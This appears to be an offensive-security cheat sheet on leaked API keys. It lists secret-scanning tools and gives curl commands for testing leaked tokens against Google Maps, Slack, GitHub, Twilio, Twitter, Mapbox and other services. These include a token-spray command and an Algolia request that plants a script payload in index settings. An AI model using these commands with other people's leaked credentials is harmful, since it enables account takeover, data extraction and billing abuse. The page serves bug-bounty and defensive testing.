# API Key and Token Leaks

> The API key is a unique identifier that is used to authenticate requests associated with your project. Some developers might hardcode them or leave it on public shares.

## Summary

- [Tools](#tools)
- [Exploit](#exploit)
    - [Google Maps](#google-maps)
    - [Algolia](#algolia)
    - [Slack API Token](#slack-api-token)
    - [Facebook Access Token](#facebook-access-token)
    - [Github client id and client secret](#github-client-id-and-client-secret)
    - [Twilio Account_sid and Auth Token](#twilio-account_sid-and-auth-token)
    - [Twitter API Secret](#twitter-api-secret)
    - [Twitter Bearer Token](#twitter-bearer-token)
    - [Gitlab Personal Access Token](#gitlab-personal-access-token)
    - [HockeyApp API Token](#hockeyapp-api-token)
    - [Mapbox API Token](#mapbox-api-token)


## Tools

- [momenbasel/KeyFinder](https://github.com/momenbasel/KeyFinder) - is a tool that let you find keys while surfing the web
- [streaak/keyhacks](https://github.com/streaak/keyhacks) - is a repository which shows quick ways in which API keys leaked by a bug bounty program can be checked to see if they're valid
- [trufflesecurity/truffleHog](https://github.com/trufflesecurity/truffleHog) - Find credentials all over the place
    ```ps1
    ## Scan a Github Organization
    docker run --rm -it -v "$PWD:/pwd" trufflesecurity/trufflehog:latest github --org=trufflesecurity
    
    ## Scan a GitHub Repository, its Issues and Pull Requests
    docker run --rm -it -v "$PWD:/pwd" trufflesecurity/trufflehog:latest github --repo https://github.com/trufflesecurity/test_keys --issue-comments --pr-comments
   
    ## Scan a Docker image for verified secrets
    docker run --rm -it -v "$PWD:/pwd" trufflesecurity/trufflehog:latest docker --image trufflesecurity/secrets
    ```
- [aquasecurity/trivy](https://github.com/aquasecurity/trivy) - General purpose vulnerability and misconfiguration scanner which also searches for API keys/secrets
- [projectdiscovery/nuclei-templates](https://github.com/projectdiscovery/nuclei-templates) - Use these templates to test an API token against many API service endpoints
    ```powershell
    nuclei -t token-spray/ -var token=token_list.txt
    ```
- [blacklanternsecurity/badsecrets](https://github.com/blacklanternsecurity/badsecrets) - A library for detecting known or weak secrets on across many platforms
    ```ps1
    python examples/cli.py --url http://example.com/contains_bad_secret.html
    python examples/cli.py eyJhbGciOiJIUzI1NiJ9.eyJJc3N1ZXIiOiJJc3N1ZXIiLCJVc2VybmFtZSI6IkJhZFNlY3JldHMiLCJleHAiOjE1OTMxMzM0ODMsImlhdCI6MTQ2NjkwMzA4M30.ovqRikAo_0kKJ0GVrAwQlezymxrLGjcEiW_s3UJMMCo
    python ./badsecrets/examples/blacklist3r.py --viewstate /wEPDwUJODExMDE5NzY5ZGQMKS6jehX5HkJgXxrPh09vumNTKQ== --generator EDD8C9AE
    python ./badsecrets/examples/telerik_knownkey.py --url http://vulnerablesite/Telerik.Web.UI.DialogHandler.aspx
    python ./badsecrets/examples/symfony_knownkey.py --url https://localhost/
    ```
- [mazen160/secrets-patterns-db](https://github.com/mazen160/secrets-patterns-db) - Secrets Patterns DB: The largest open-source Database for detecting secrets, API keys, passwords, tokens, and more.
- [d0ge/sign-saboteur](https://github.com/d0ge/sign-saboteur) - SignSaboteur is a Burp Suite extension for editing, signing, verifying various signed web tokens


## Exploit

The following commands can be used to takeover accounts or extract personal information from the API using the leaked token.

### Google Maps 

* [ozguralp/gmapsapiscanner/](https://github.com/ozguralp/gmapsapiscanner/) - Google Maps API Scanner

|  Name                 |  Endpoint |
| --------------------- | --------- |
|  Static Maps          | [/maps/api/staticmap?key=KEY](https://maps.googleapis.com/maps/api/staticmap?center=45%2C10&zoom=7&size=400x400&key=KEY) |
|  Streetview           | [/maps/api/streetview?key=KEY](https://maps.googleapis.com/maps/api/streetview?size=400x400&location=40.720032,-73.988354&fov=90&heading=235&pitch=10&key=KEY) |
|  Embed                | [/maps/embed/v1/place?key=KEY](https://www.google.com/maps/embed/v1/place?q=place_id:ChIJyX7muQw8tokR2Vf5WBBk1iQ&key=KEY) |
|  Directions           | [/maps/api/directions/json?key=KEY](https://maps.googleapis.com/maps/api/directions/json?origin=Disneyland&destination=Universal+Studios+Hollywood4&key=KEY) |
|  Geocoding            | [/maps/api/geocode/json?key=KEY](https://maps.googleapis.com/maps/api/geocode/json?latlng=40,30&key=KEY) |
|  Distance Matrix      | [/maps/api/distancematrix/json?key=KEY](https://maps.googleapis.com/maps/api/distancematrix/json?units=imperial&origins=40.6655101,-73.89188969999998&destinations=40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.659569%2C-73.933783%7C40.729029%2C-73.851524%7C40.6860072%2C-73.6334271%7C40.598566%2C-73.7527626%7C40.659569%2C-73.933783%7C40.729029%2C-73.851524%7C40.6860072%2C-73.6334271%7C40.598566%2C-73.7527626&key=KEY) |
|  Find Place from Text | [/maps/api/place/findplacefromtext/json?key=KEY](https://maps.googleapis.com/maps/api/place/findplacefromtext/json?input=Museum%20of%20Contemporary%20Art%20Australia&inputtype=textquery&fields=photos,formatted_address,name,rating,opening_hours,geometry&key=KEY) |
|  Autocomplete         | [/maps/api/place/autocomplete/json?key=KEY](https://maps.googleapis.com/maps/api/place/autocomplete/json?input=Bingh&types=%28cities%29&key=KEY) |
|  Elevation            | [/maps/api/elevation/json?key=KEY](https://maps.googleapis.com/maps/api/elevation/json?locations=39.7391536,-104.9847034&key=KEY)   |
|  Timezone             | [/maps/api/timezone/json?key=KEY](https://maps.googleapis.com/maps/api/timezone/json?location=39.6034810,-119.6822510&timestamp=1331161200&key=KEY) |
|  Roads                | [roads.googleapis.com/v1/nearestRoads?key=KEY](https://roads.googleapis.com/v1/nearestRoads?points=60.170880,24.942795&key=KEY) |
|  Geolocate            | [www.googleapis.com/geolocation/v1/geolocate?key=KEY](https://www.googleapis.com/geolocation/v1/geolocate?key=KEY) |


**Impact**:

* Consuming the company's monthly quota or can over-bill with unauthorized usage of this service and do financial damage to the company
* Conduct a denial of service attack specific to the service if any limitation of maximum bill control settings exist in the Google account


### Algolia 

```powershell
curl --request PUT \
  --url https://<application-id>-1.algolianet.com/1/indexes/<example-index>/settings \
  --header 'content-type: application/json' \
  --header 'x-algolia-api-key: <example-key>' \
  --header 'x-algolia-application-id: <example-application-id>' \
  --data '{"highlightPreTag": "<script>alert(1);</script>"}'
```


### Slack API Token

```powershell
curl -sX POST "https://slack.com/api/auth.test?token=xoxp-TOKEN_HERE&pretty=1"
```


### Facebook Access Token

```powershell
curl https://developers.facebook.com/tools/debug/accesstoken/?access_token=ACCESS_TOKEN_HERE&version=v3.2
```


### Github client id and client secret

```powershell
curl 'https://api.github.com/users/whatever?client_id=xxxx&client_secret=yyyy'
```


### Twilio Account_sid and Auth token

```powershell
curl -X GET 'https://api.twilio.com/2010-04-01/Accounts.json' -u ACCOUNT_SID:AUTH_TOKEN
```


### Twitter API Secret

```powershell
curl -u 'API key:API secret key' --data 'grant_type=client_credentials' 'https://api.twitter.com/oauth2/token'
```


### Twitter Bearer Token

```powershell
curl --request GET --url https://api.twitter.com/1.1/account_activity/all/subscriptions/count.json --header 'authorization: Bearer TOKEN'
```


### Gitlab Personal Access Token

```powershell
curl "https://gitlab.example.com/api/v4/projects?private_token=<your_access_token>"
```


### HockeyApp API Token

```powershell
curl -H "X-HockeyAppToken: ad136912c642076b0d1f32ba161f1846b2c" https://rink.hockeyapp.net/api/2/apps/2021bdf2671ab09174c1de5ad147ea2ba4
```


### Mapbox API Token

A Mapbox API Token is a JSON Web Token (JWT). If the header of the JWT is `sk`, jackpot. If it's `pk` or `tk`, it's not worth your time.

* Check token validity: 
    ```ps1
    curl "https://api.mapbox.com/tokens/v2?access_token=YOUR_MAPBOX_ACCESS_TOKEN"
    ```
    
* Get list of all tokens associated with an account (only works if the token is a Secret Token (sk), and has the appropriate scope)
    ```ps1
    curl "https://api.mapbox.com/tokens/v2/MAPBOX_USERNAME_HERE?access_token=YOUR_MAPBOX_ACCESS_TOKEN"
    ```


## References

* [Finding Hidden API Keys & How to use them - Sumit Jain - August 24, 2019](https://medium.com/@sumitcfe/finding-hidden-api-keys-how-to-use-them-11b1e5d0f01d)
* [Private API key leakage due to lack of access control - yox - August 8, 2018](https://hackerone.com/reports/376060)
* [Saying Goodbye to my Favorite 5 Minute P1 - Allyson O'Malley - January 6, 2020](https://www.allysonomalley.com/2020/01/06/saying-goodbye-to-my-favorite-5-minute-p1/)
* [Mapbox API Token Documentation](https://docs.mapbox.com/help/troubleshooting/how-to-use-mapbox-securely/)
* [Introducing SignSaboteur: forge signed web tokens with ease - Zakhar Fedotkin - 22 May 2024](https://portswigger.net/research/introducing-signsaboteur-forge-signed-web-tokens-with-ease)